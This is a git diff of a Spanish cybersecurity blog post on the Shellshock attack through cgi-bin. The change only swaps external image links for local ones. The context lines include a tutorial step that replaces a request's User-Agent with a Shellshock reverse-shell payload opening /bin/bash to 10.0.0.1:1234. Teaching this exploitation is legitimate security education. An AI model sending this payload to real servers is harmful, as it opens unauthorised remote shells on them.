@@ -6,9 +6,9 @@ title: Ataque Shellshock
 subtitle: 'a través de cgi-bin'
 description: >-
 image: >-
-    http://imgfz.com/i/LT3baoC.png
+    /images/shellshocklogo.png
 optimized_image: >-
-  http://imgfz.com/i/LT3baoC.png
+    /images/shellshocklogo.png
 category: ciberseguridad
 tags: 
   - linux
@@ -24,7 +24,8 @@ El ataque se Shellshock es una vulnerabilidad de ejecución remota de comandos p
 
 * Una manera es observando el código fuente de la página, la cual nos puede entregar pistas sobre el directorio ```cgi-bin```:
 
-  ![1](http://imgfz.com/i/wdlEgfi.png)
+
+[![shellshockvuln](/images/shellshockvuln.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/shellshockvuln.png)
   
 * Una vez detectado podemos realizar fuzzing para ver que hay tras el directorio ```cgi-bin```:
 
@@ -92,7 +93,7 @@ Para explotarlo podemos realizarlo por medio de ```BurpSuite``` y ```CURL```, in
 ```
 Ahora interceptaremos peticiones en la dirección que hemos encontrado:
 
-![2](http://imgfz.com/i/XbhRtWQ.png)
+[![bsshellshock](/images/bsshellshock.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/bsshellshock.png)
 
 Y cambiaremos el ```User-Agent``` que se encuentra marcado con el cuadro rojo, por lo siguiente:
 
@@ -101,7 +102,7 @@ User Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 ```
 Procedemos a reemplazar y adaptar el ```User-Agent```:
 
-![3](http://imgfz.com/i/uoBJDHz.png)
+[![shellshockbs](/images/shellshockbs.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/shellshockbs.png)
 
 Le damos a ```Forward```:
 
